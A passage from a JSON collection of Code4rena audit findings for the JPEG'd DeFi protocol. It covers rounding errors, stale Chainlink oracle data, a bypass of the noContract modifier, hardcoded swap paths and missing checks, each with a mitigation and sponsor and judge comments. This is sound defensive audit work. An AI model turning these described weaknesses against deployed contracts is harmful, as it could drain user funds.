class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) { </span><span class=\"mtk3\">//@audit low: poolInfo is unbounded</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_updatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_withdrawReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">i</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Consider introducing a reasonable upper limit based on block gas limits and/or adding a <code>remove</code> method to remove elements in the array.</p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-03-unbounded-loop-on-array-can-lead-to-dos",
      "tags": [],
      "finders": []
    },
    {
      "id": "4396",
      "title": "[L-02] Immutable addresses should be 0-checked",
      "impact": "LOW",
      "content": "<h2 id=\"l-02-immutable-addresses-should-be-0-checked\" style=\"position:relative;\"><a href=\"#l-02-immutable-addresses-should-be-0-checked\" aria-label=\"l 02 immutable addresses should be 0 checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Immutable addresses should be 0-checked</h2>\n<p>Consider adding an <code>address(0)</code> check here (see <code>@audit</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">28</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">53</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit low: should be address(0)</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-02-immutable-addresses-should-be-0-checked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4395",
      "title": "[L-01] Add constructor initializers",
      "impact": "LOW",
      "content": "<h2 id=\"l-01-add-constructor-initializers\" style=\"position:relative;\"><a href=\"#l-01-add-constructor-initializers\" aria-label=\"l 01 add constructor initializers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Add constructor initializers</h2>\n<p>As per <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6\">OpenZeppelin’s (OZ) recommendation</a>, “The guidelines are now to make it impossible for <em>anyone</em> to run <code>initialize</code> on an implementation contract, by adding an empty constructor with the <code>initializer</code> modifier. So the implementation contract gets initialized automatically upon deployment.”</p>\n<p>Note that this behaviour is also incorporated the <a href=\"https://wizard.openzeppelin.com/\">OZ Wizard</a> since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the <a href=\"https://wizard.openzeppelin.com/\">Wizard 19</a> to include a constructor that automatically initializes the implementation when deployed.”</p>\n<p>Furthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CryptoPunksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">punksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">helpers</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EtherRocksHelper</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">19</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocksAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">21</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20Upgradeable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jpeg</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initializer</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">66</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/NFTVault.sol:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">139</span><span class=\"mtk1\">:     </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">initialize</span><span class=\"mtk1\">(</span></span></span></code></pre>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#l-01-add-constructor-initializers",
      "tags": [],
      "finders": []
    },
    {
      "id": "1926",
      "title": "[M-11] Division before Multiplication May Result In No Interest Being Accrued",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS, also found by minhquanym_\n\n[NFTVault.sol#L590-L595](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590-L595)<br>\n\nThere is a division before multiplication bug in `NFTVault._calculateAdditionalInterest()` which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places.\n\nThis issue occurs since an intermediate calculation of  `interestPerSec` may round to zero and therefore the multiplication by `elapsedTime` may remain zero.\n\nFurthermore, even if `interestPerSec > 0` there will still be rounding errors as a result of doing division before multiplication and `_calculatedInterest()` will be understated.\n\nThis issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). Since many ERC20 tokens such as USDC and USDT only have 6 decimal places a numerator of less 30 \\* 10^6 will round to zero.\n\nThe rate also multiplies into the denominator. e.g. If the rate is 1% then the denominator will be equivalent to `1 / rate * 30 * 10^6 = 3,000 * 10^6`.\n\n### Proof of Concept\n\nThe order of operations for the interest calculations\n\n*   `totalDebtAmount`\n*   MUL `settings.debtInterestApr.numerator`\n*   DIV `settings.debtInterestApr.denominator`\n*   DIV `365 days`\n*   MUL `elapsedTime`\n\nIf the intermediate value of `interestPerSec = 0` then the multiplication by `elapsedTime` will still be zero and no interested will be accrued.\n\nExcerpt from `NFTVault._calculateAdditionalInterest()`.\n\n            uint256 interestPerYear = (totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator;\n            uint256 interestPerSec = interestPerYear / 365 days;\n\n            return elapsedTime * interestPerSec;\n\n### Recommended Mitigation Steps\n\nThis issue may be resolved by performing the multiplication by `elapsedTime` before the division by the denominator or `365 days`.\n\n            uint256 interestAccrued = (elapsedTime * \n                totalDebtAmount *\n                settings.debtInterestApr.numerator) /\n                settings.debtInterestApr.denominator /\n                365 days;\n\n            return  interestAccrued;\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97):**\n > Fixed [jpegd/core#8](https://github.com/jpegd/core/pull/8). \n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/97#issuecomment-1110008295):**\n > This report makes sense as a medium to me because it involves a calculation error that can lead to the protocol functioning incorrectly.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a division before multiplication bug in the code of NFTVault._calculateAdditionalInterest() which may result in no interesting being accrued and will have significant rounding issues for tokens with small decimal places. The issue occurs since an intermediate calculation of  interestPerSec may round to zero and therefore the multiplication by elapsedTime may remain zero. Furthermore, even if interestPerSec > 0 there will still be rounding errors as a result of doing division before multiplication and _calculatedInterest() will be understated. This issue is significant as one divisor is 365 days = 30,758,400 (excluding the rate). The rate also multiplies into the denominator, which can cause the numerator to round to zero.\n\nThe recommended mitigation steps for this issue are to perform the multiplication by elapsedTime before the division by the denominator or 365 days.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/97",
      "tags": [],
      "finders": [
        "AuditsAreUS",
        "minhquanym"
      ]
    },
    {
      "id": "1925",
      "title": "[M-10] Chainlink pricer is using a deprecated API",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by 0xDjango, 0xkatana, berndartmueller, Cr4ckM3, defsec, horsefacts, hyh, JMukesh, joshie, Jujic, pedroais, peritoflores, rayn, reassor, Ruhum, and WatchPug_\n\nAccording to Chainlink's documentation, the latestAnswer function is deprecated. This function might suddenly stop working if Chainlink stops supporting deprecated APIs. And the old API can return stale data.\n\n### Proof of Concept\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n[NFTVault.sol#L459](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L459)<br>\n\n### Recommended Mitigation Steps\n\nUse the latestRoundData function to get the price instead. Add checks on the return data with proper revert messages if the price is stale or the round is uncomplete.<br>\n<https://docs.chain.link/docs/price-feeds-api-reference/>\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/4#issuecomment-1099244659):**\n > Fixed in [jpegd/core#9](https://github.com/jpegd/core/pull/9).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the FungibleAssetVaultForDAO.sol and NFTVault.sol contracts. The vulnerability is related to the use of the deprecated latestAnswer function, which might suddenly stop working if Chainlink stops supporting deprecated APIs and can return stale data. To mitigate this vulnerability, it is recommended to use the latestRoundData function to get the price instead and to add checks on the return data with proper revert messages if the price is stale or the round is incomplete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/4",
      "tags": [],
      "finders": [
        "reassor",
        "JMukesh",
        "0xkatana",
        "cccz",
        "0xDjango",
        "Ruhum",
        "Jujic",
        "WatchPug",
        "berndartmueller",
        "pedroais",
        "peritoflores",
        "rayn",
        "joshie",
        "Cr4ckM3",
        "hyh",
        "horsefacts",
        "defsec"
      ]
    },
    {
      "id": "1924",
      "title": "[M-09] The noContract modifier does not work as expected.",
      "impact": "MEDIUM",
      "content": "_Submitted by Wayne, also found by hyh, PPrieditis, rayn, smiling_heretic, and Cr4ckM3_\n\n[yVault.sol#L61](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61)<br>\n[yVaultLPFarming.sol#L54](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/farming/yVaultLPFarming.sol#L54)<br>\n\nThe expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, if access is controlled using ! access control with \\_account.isContract(), then because isContract() gets the size of the code length of the account in question by relying on extcodesize/address.code.length, this means that the restriction can be bypassed when deploying a smart contract through the smart contract's constructor call.\n\n### Recommended Mitigation Steps\n\nModify the code to `require(msg.sender == tx.origin);`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1095292333):**\n > The observations made in the issue are correct, but given how impractical it would be to make an autocompounder that bypasses the `noContract` modifier this issue should probably be severity 0. It's worth mentioning that this behaviour was already known as outlined in the modifier's documentation.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1099249484):**\n > Fixed in [jpegd/core#17](https://github.com/jpegd/core/pull/17).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/11#issuecomment-1109971129):**\n > I'm going to let this stand. Impractical or not, this is very easily exploited.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract system. The expectation of the noContract modifier is to allow access only to accounts inside EOA or Whitelist, however, access can be bypassed when deploying a smart contract through the smart contract's constructor call. This is due to the restriction relying on extcodesize/address.code.length. The proof of concept for this vulnerability is provided in the form of direct links to the relevant code in GitHub. The recommended mitigation step is to modify the code to require(msg.sender == tx.origin).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/11",
      "tags": [],
      "finders": [
        "PPrieditis",
        "smilingheretic",
        "rayn",
        "Cr4ckM3_",
        "hyh",
        "Wayne"
      ]
    },
    {
      "id": "1923",
      "title": "[M-08] `_swapUniswapV2` may use an improper `path` which can cause a loss of the majority of the rewardTokens",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n[StrategyPUSDConvex.sol#L311-L334](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L311-L334)<br>\n\n```solidity\nfunction harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n    convexConfig.baseRewardPool.getReward(address(this), true);\n\n    //Prevent `Stack too deep` errors\n    {\n        DexConfig memory dex = dexConfig;\n        IERC20[] memory rewardTokens = strategyConfig.rewardTokens;\n        IERC20 _weth = weth;\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 balance = rewardTokens[i].balanceOf(address(this));\n\n            if (balance > 0)\n                //minOut is not needed here, we already have it on the Curve deposit\n                _swapUniswapV2(\n                    dex.uniswapV2,\n                    rewardTokens[i],\n                    _weth,\n                    balance,\n                    0\n                );\n        }\n\n        uint256 wethBalance = _weth.balanceOf(address(this));\n        require(wethBalance > 0, \"NOOP\");\n        ...\n```\n\n[StrategyPUSDConvex.sol#L410-L430](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L410-L430)<br>\n\n```solidity\n function _swapUniswapV2(\n    IUniswapV2Router router,\n    IERC20 tokenIn,\n    IERC20 tokenOut,\n    uint256 amountIn,\n    uint256 minOut\n) internal {\n    tokenIn.safeIncreaseAllowance(address(router), amountIn);\n\n    address[] memory path = new address[](2);\n    path[0] = address(tokenIn);\n    path[1] = address(tokenOut);\n\n    router.swapExactTokensForTokens(\n        amountIn,\n        minOut,\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n```\n\nIn the current implementation, `rewardTokens` from the underlying strategy will be swapped to `weth` first then `weth` -> `usdc`.\n\nHowever, the `path` used for swapping from `rewardToken` -> `weth` is hardcoded as `[rewardToken, weth]`, which may not be the optimal route.\n\nFor example, the majority liquidity for a particular `rewardToken` may actually be in the `rewardToken/USDC` pool. Swapping through the `rewardToken/WETH` with low liquidity may end up getting only a dust amount of WETH.\n\n### Recommended Mitigation Steps\n\nConsider allowing the admin to set a path for the rewardTokens.\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1098388022):**\n > As of now, the one in the contract is the optimal routing path.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/157#issuecomment-1109923759):**\n > I think the warden has made a reasonable find and recommendation. The sponsor used the phrase 'as of now' in disputing the report, but the idea that it may not always be the optimal path is actually specifically what the report and its mitigation addresses. That said, external factors are required so moving it to medium severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project hosted on Github. The code in question is for a contract called StrategyPUSDConvex.sol. This code is responsible for swapping reward tokens for WETH (Wrapped Ether) and then WETH for USDC (USD Coin). The problem is that the code hardcodes the path for the reward tokens to WETH, which may not be the most optimal route. This could result in only a dust amount of WETH being received for the reward tokens. The recommendation is to consider allowing the admin to set a path for the reward tokens.",
      "quality_score": 0,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/157",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1922",
      "title": "[M-07] Wrong calculation for `yVault` price per share if decimals != 18",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller_\n\nThe [yVault.getPricePerFullShare()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L196) function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. `yVault` has the same amount of decimals as it's underlying token see ([yVault.decimals()](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L70))\n\nBut tokens don't always have `1e18` decimals (e.g. USDC).\n\n### Impact\n\nThe price per share calculation does not return the correct price for underlying tokens that do not have 18 decimals. This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user.\n\n### Proof of Concept\n\nFollowing test will fail with the current implementation when the underlying vault token has 6 decimals:\n\n*NOTE: `units()` helper function was adapted to accept the desired decimals.*\n\n```typescript\nit.only(\"should mint the correct amount of tokens for tokens with 6 decimals\", async () => {\n  const DECIMALS = 6;\n\n  await token.setDecimals(DECIMALS);\n  expect(await yVault.decimals()).to.equal(DECIMALS);\n\n  expect(await yVault.getPricePerFullShare()).to.equal(0);\n  await token.mint(user1.address, units(1000, DECIMALS));\n  await token.connect(user1).approve(yVault.address, units(1000, DECIMALS));\n\n  await yVault.connect(user1).deposit(units(500, DECIMALS));\n  expect(await yVault.balanceOf(user1.address)).to.equal(units(500, DECIMALS));\n\n  await token.mint(strategy.address, units(500, DECIMALS));\n  expect(await yVault.getPricePerFullShare()).to.equal(units(2, DECIMALS));\n});\n```\n\nFails with following error: `AssertionError: Expected \"2000000000000000000\" to be equal 2000000`\n\n### Recommended mitigation steps\n\nUse vault `decimals()` instead of hardcoded `1e18` decimals.\n\n```solidity\nfunction getPricePerFullShare() external view returns (uint256) {\n    uint256 supply = totalSupply();\n    if (supply == 0) return 0;\n    return (balance() * (10**decimals())) / supply; // @audit-info use `decimals()` instead of hardcoded `1e18`\n}\n```\n\n**[spaghettieth (JPEG'd) disputed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1097985902):**\n > The `yVault` contract has been designed to work with Curve LPs, which have 18 decimals\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/117#issuecomment-1109895569):**\n > I'm downgrading this to a medium risk but leaving it as valid. Any number of external factors could conspire to result in a non-18 decimal token being used in the future, at which point this code may have been forgotten. A better choice would be to do a decimal check.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the function getPricePerFullShare() in the yVault contract. The function calculates the price per share by multiplying with `1e18` token decimals with the assumption that the underlying token always has 18 decimals. However, tokens don't always have `1e18` decimals (e.g. USDC). This could lead to paying out too little or too much and therefore to a loss for either the protocol or the user. A proof of concept is provided to demonstrate the issue. The recommended mitigation step is to use the vault `decimals()` instead of hardcoded `1e18` decimals.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/117",
      "tags": [
        "Decimals"
      ],
      "finders": [
        "berndartmueller"
      ]
    },
    {
      "id": "1921",
      "title": "[M-06] Oracle data feed is insufficiently validated.",
      "impact": "MEDIUM",
      "content": "_Submitted by Jujic, also found by hickuphh3_\n\nPrice can be stale and can lead to wrong `answer` return value.\n\n### Proof of Concept\n\nOracle data feed is insufficiently validated. There is no check for stale price and round completeness. Price can be stale and can lead to wrong  `answer`  return value.\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n        int256 answer = oracle.latestAnswer();\n        uint8 decimals = oracle.decimals();\n\n        require(answer > 0, \"invalid_oracle_answer\");\n\n        ...\n\n```\n\n[FungibleAssetVaultForDAO.sol#L105](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L105)<br>\n\n### Recommended Mitigation Steps\n\nValidate data feed\n\n```\nfunction _collateralPriceUsd() internal view returns (uint256) {\n\n(uint80 roundID, int256 answer, , uint256 timestamp, uint80 answeredInRound) = oracle.latestRoundData();\n   \n    require(answer > 0, \"invalid_oracle_answer\");\n    require(answeredInRound >= roundID, \"ChainLink: Stale price\");\n    require(timestamp > 0, \"ChainLink: Round not complete\");\n\n         ...\n\n```\n\n**[0xJPEG (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/54#issuecomment-1101687980):**\n > Can add validation for round not being complete yet and potentially for stale pricing.<br>\n> This should be medium risk, as shown in past contests [[1]](https://github.com/code-423n4/code423n4.com/blob/65f9f13b7502c264098fe65ab57e79fcf99e956d/_data/reports/2022-01-notional.md#m-01-usage-of-deprecated-chainlink-api-in-eip1271wallet) [[2]](https://github.com/code-423n4/code423n4.com/blob/61f7d00561352d0c312b7f516404840eb68c824e/_data/reports/2021-12-yetifinance.md#m-02-should-check-return-data-from-chainlink-aggregators) 